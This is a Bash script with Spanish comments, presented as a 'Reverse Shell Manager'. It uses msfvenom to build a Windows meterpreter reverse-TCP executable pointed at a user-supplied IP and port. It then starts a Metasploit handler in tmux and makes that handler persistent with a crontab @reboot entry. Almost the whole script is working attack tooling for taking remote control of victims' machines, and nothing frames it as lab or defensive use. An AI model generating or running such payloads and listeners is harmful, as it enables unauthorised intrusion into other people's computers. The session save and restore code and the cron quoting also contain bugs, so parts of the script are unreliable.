
#!/bin/bash

# Colores para salida de texto
GREEN="\e[32m"
RED="\e[31m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

# Directorios y archivos esenciales
LOG_DIR="./logs"
PAYLOAD_DIR="./payloads"
SESSION_FILE="./session_state.cfg"
mkdir -p "$LOG_DIR" "$PAYLOAD_DIR"

# Verificar dependencias
DEPENDENCIAS=("bash" "curl" "wget" "python3" "msfvenom" "tmux" "zenity" "jq")
check_dependencies() {
    echo -e "${CYAN}[INFO] Verificando dependencias...${RESET}"
    for dep in "${DEPENDENCIAS[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${YELLOW}[WARN] Falta dependencia: $dep. Instalando...${RESET}"
            sudo apt-get install -y "$dep"
        else
            echo -e "${GREEN}[OK] $dep está instalado.${RESET}"
        fi
    done
}

# Guardar sesión
save_session() {
    echo "LHOST=$lhost" > "$SESSION_FILE"
    echo "LPORT=$lport" >> "$SESSION_FILE"
    echo "PAYLOAD=$payload" >> "$SESSION_FILE"
    echo -e "${GREEN}[SUCCESS] Sesión guardada en $SESSION_FILE.${RESET}"
}

# Restaurar sesión
restore_session() {
    if [ -f "$SESSION_FILE" ]; then
        source "$SESSION_FILE"
        echo -e "${GREEN}[INFO] Sesión restaurada: LHOST=$lhost, LPORT=$lport, PAYLOAD=$payload.${RESET}"
    else
        echo -e "${RED}[ERROR] No se encontró una sesión previa.${RESET}"
    fi
}

# Generar payload
generate_payload() {
    lhost=$(zenity --entry --title="LHOST" --text="Ingrese la IP de conexión:")
    lport=$(zenity --entry --title="LPORT" --text="Ingrese el puerto de conexión:")
    payload="windows/meterpreter_reverse_tcp"
    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f exe -o "$PAYLOAD_DIR/payload.exe"
    save_session
}

# Consola automática y persistente
start_reverse_shell() {
    restore_session
    tmux new-session -d -s reverse_shell "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit'"
    (crontab -l 2>/dev/null; echo "@reboot tmux new-session -d -s reverse_shell 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit"'") | crontab -
    echo -e "${GREEN}[SUCCESS] Consola de Metasploit iniciada y configurada para persistencia.${RESET}"
}

# Menú principal
main_menu() {
    while true; do
        clear
        echo -e "${CYAN}=============================="
        echo -e " Reverse Shell Manager "
        echo -e "==============================${RESET}"
        echo -e "1. Verificar dependencias"
        echo -e "2. Generar payload"
        echo -e "3. Restaurar sesión previa"
        echo -e "4. Iniciar consola automática"
        echo -e "5. Salir"
        read -p "Seleccione una opción: " option

        case $option in
            1) check_dependencies ;;
            2) generate_payload ;;
            3) restore_session ;;
            4) start_reverse_shell ;;
            5) exit 0 ;;
            *) echo -e "${RED}[ERROR] Opción inválida.${RESET}" ;;
        esac
        read -p "Presione Enter para continuar..."
    done
}

# Iniciar script
main_menu
